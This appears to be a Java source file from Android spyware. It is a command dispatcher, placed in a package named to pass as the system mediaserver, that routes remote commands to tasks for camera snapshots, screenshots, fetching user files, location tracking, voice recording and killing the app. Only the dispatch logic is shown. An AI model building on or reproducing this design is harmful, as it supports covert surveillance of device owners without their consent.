package com.android.mediaserver.task;

import android.content.Context;
import com.android.mediaserver.command.CameraSnapshotCommand;
import com.android.mediaserver.command.Command;
import com.android.mediaserver.command.ConfigurationCommand;
import com.android.mediaserver.command.FetchUserFileCommand;
import com.android.mediaserver.command.KillCommand;
import com.android.mediaserver.command.LocationCommand;
import com.android.mediaserver.command.ScreenshotCommand;
import com.android.mediaserver.command.VoiceRecordCommand;

public class TaskFactory {
  public static Task getTask(Command command, Context context) {
    if (command instanceof KillCommand) {
      return new KillTask(command, context);
    }
    if (command instanceof ConfigurationCommand) {
      return new ConfigurationTask(command, context);
    }
    if (command instanceof CameraSnapshotCommand) {
      return new CameraSnapshotTask(command, context);
    }
    if (command instanceof ScreenshotCommand) {
      return new ScreenshotTask(command, context);
    }
    if (command instanceof FetchUserFileCommand) {
      return new FetchUserFileTask(command, context);
    }
    if (command instanceof LocationCommand) {
      return new LocationTask(command, context);
    }
    if (command instanceof VoiceRecordCommand) {
      return new VoiceRecordTask(command, context);
    }
    return null;
  }
}
